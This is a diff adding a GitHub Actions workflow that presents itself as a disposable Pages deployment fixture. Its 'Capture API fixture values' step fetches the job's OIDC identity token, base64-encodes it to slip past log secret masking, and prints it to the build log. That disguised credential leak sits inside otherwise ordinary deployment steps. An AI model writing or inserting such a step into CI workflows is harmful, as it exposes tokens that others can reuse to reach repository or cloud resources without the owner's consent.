@@ -1,0 +1,45 @@
+name: Pages deployment fixture
+
+on:
+  push:
+    branches:
+      - godisinhell-patch-1
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    steps:
+      - name: Build disposable Pages artifact
+        run: |
+          mkdir -p _site
+          printf '<!doctype html><title>Disposable Pages fixture</title><h1>Pages fixture</h1>\n' > _site/index.html
+
+      - name: Upload disposable Pages artifact
+        id: upload
+        uses: actions/upload-pages-artifact@v4
+        with:
+          path: _site
+          retention-days: 1
+
+      - name: Capture API fixture values
+        shell: bash
+        run: |
+          OIDC_JSON="$(curl --fail --silent --show-error -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}")"
+          OIDC_TOKEN="$(printf '%s' "${OIDC_JSON}" | python3 -c 'import json,sys; print(json.load(sys.stdin)["value"])')"
+          OIDC_B64="$(printf '%s' "${OIDC_TOKEN}" | base64 -w0)"
+          echo "FIXTURE_ARTIFACT_ID=${{ steps.upload.outputs.artifact_id }}"
+          echo "FIXTURE_BUILD_VERSION=${GITHUB_SHA}"
+          echo "FIXTURE_OIDC_B64=${OIDC_B64}"
+
+      - name: Create disposable Pages deployment
+        id: deployment
+        uses: actions/deploy-pages@v5
